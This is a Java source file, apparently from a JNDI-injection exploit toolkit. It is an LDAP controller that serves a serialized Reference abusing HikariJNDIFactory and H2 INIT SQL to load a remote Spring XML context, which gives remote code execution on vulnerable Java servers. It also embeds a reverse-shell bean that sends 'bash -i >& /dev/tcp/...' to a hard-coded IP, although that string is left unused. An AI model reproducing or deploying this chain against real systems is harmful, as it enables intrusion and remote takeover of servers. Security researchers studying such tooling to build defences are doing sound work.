package com.feihong.ldap.controllers;

import com.feihong.ldap.enumtypes.PayloadType;
import com.feihong.ldap.exceptions.IncorrectParamsException;
import com.feihong.ldap.exceptions.UnSupportedPayloadTypeException;
import com.feihong.ldap.utils.Util;
import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
import com.unboundid.ldap.sdk.Entry;
import com.unboundid.ldap.sdk.LDAPResult;
import com.unboundid.ldap.sdk.ResultCode;

import javax.naming.Reference;
import javax.naming.StringRefAddr;
import java.util.ArrayList;
import java.util.List;

@LdapMapping(uri = { "/h2classpathxmlapplicationcontext" })
public class H2ClassPathXmlApplicationContext implements LdapController{

    private PayloadType type;
    private String[] params;
    
    @Override
    public void sendResult(InMemoryInterceptedSearchResult result, String base) throws Exception {
        System.out.println("[+] Sending LDAP ResourceRef result for " + base);

        Entry e = new Entry(base);
        e.addAttribute("javaClassName", "java.lang.String"); //could be any
        //prepare payload that exploits unsafe reflection in org.apache.naming.factory.BeanFactory
        javax.naming.Reference ref = getResourceRefByClassPathXmlApplicationContext(params[0]);

        e.addAttribute("javaSerializedData", Util.serialize(ref));

        result.sendSearchEntry(e);
        result.setResult(new LDAPResult(0, ResultCode.SUCCESS));

        System.out.println("[+] Done Sending LDAP ResourceRef result");
    }

    private static Reference getResourceRefByClassPathXmlApplicationContext(String xml_url) {
        List<String> list = new ArrayList<>();

        // Drop the previous alias if exists
        list.add("DROP ALIAS IF EXISTS INVOKE_CONSTRUCTOR");
        list.add("DROP ALIAS IF EXISTS INVOKE_METHOD");
        list.add("DROP ALIAS IF EXISTS URI_CREATE");
        list.add("DROP ALIAS IF EXISTS CLASS_FOR_NAME");

        // Alias some external Java methods
        list.add("CREATE ALIAS INVOKE_CONSTRUCTOR FOR 'org.apache.commons.beanutils.ConstructorUtils.invokeConstructor(java.lang.Class, java.lang.Object)'");
        list.add("CREATE ALIAS INVOKE_METHOD FOR 'org.apache.commons.beanutils.MethodUtils.invokeMethod(java.lang.Object, java.lang.String, java.lang.Object)'");
        list.add("CREATE ALIAS URI_CREATE FOR 'java.net.URI.create(java.lang.String)'");
        list.add("CREATE ALIAS CLASS_FOR_NAME FOR 'java.lang.Class.forName(java.lang.String)'");

        // Spring XML content
        String content = "<?xml version=\"1.0\" encoding=\"UTF-8\" ?>\n" +
                "    <beans xmlns=\"http://www.springframework.org/schema/beans\"\n" +
                "       xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n" +
                "       xsi:schemaLocation=\"\n" +
                "     http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd\">\n" +
                "        <bean id=\"pb\" class=\"java.lang.ProcessBuilder\" init-method=\"start\">\n" +
                "            <constructor-arg>\n" +
                "            <list>\n" +
                "                <value>bash</value>\n" +
                "                <value>-c</value>\n" +
                "                <value><![CDATA[bash -i >& /dev/tcp/100.109.34.110/4444 0>&1]]></value>\n" +
                "            </list>\n" +
                "            </constructor-arg>\n" +
                "        </bean>\n" +
                "    </beans>\n";


        // Add SQL statements for H2 database manipulation
        list.add("SET @uri=URI_CREATE('" + xml_url + "')");
        list.add("SET @xml_url_obj=INVOKE_METHOD(@uri, 'toString', NULL)");
        list.add("SET @context_clazz=CLASS_FOR_NAME('org.springframework.context.support.ClassPathXmlApplicationContext')");
        list.add("CALL INVOKE_CONSTRUCTOR(@context_clazz, @xml_url_obj)");

        String url = "jdbc:h2:mem:testdb;TRACE_LEVEL_SYSTEM_OUT=3;INIT=" + String.join("\\;", list) + "\\;";

        Reference ref = new Reference("javax.sql.DataSource", "com.zaxxer.hikari.HikariJNDIFactory", null);
        ref.add(new StringRefAddr("driverClassName", "org.h2.Driver"));
        ref.add(new StringRefAddr("jdbcUrl", url));

        // Here, you would return or use `ref` as needed in your context
        // In this static context, simply printing out to demonstrate

        return ref;
    }

    @Override
    public void process(String base) throws UnSupportedPayloadTypeException, IncorrectParamsException {
        try{
            int firstIndex = base.indexOf("/");
            int secondIndex = base.indexOf("/", firstIndex + 1);
            if(secondIndex < 0) secondIndex = base.length();

            try{
                type = PayloadType.valueOf(base.substring(firstIndex + 1, secondIndex).toLowerCase());

                // 只支持这一种
                if(type != PayloadType.url){
                    throw new UnSupportedPayloadTypeException("UnSupportedPayloadType: " + type);
                }

                System.out.println("[+] Paylaod: " + type);
            }catch(IllegalArgumentException e){
                throw new UnSupportedPayloadTypeException("UnSupportedPayloadType: " + base.substring(firstIndex + 1, secondIndex));
            }

            switch (type){
                case url:
                    String url = Util.getUrlFromBase(base);
                    System.out.println("[+] XXE xml url: " + url);
                    params = new String[]{url};    // 设置好url，待sendResult方法内使用
                    break;
            }
        }catch(Exception e){
            if(e instanceof UnSupportedPayloadTypeException) throw (UnSupportedPayloadTypeException)e;

            throw new IncorrectParamsException("Incorrect params: " + base);
        }
    }
}
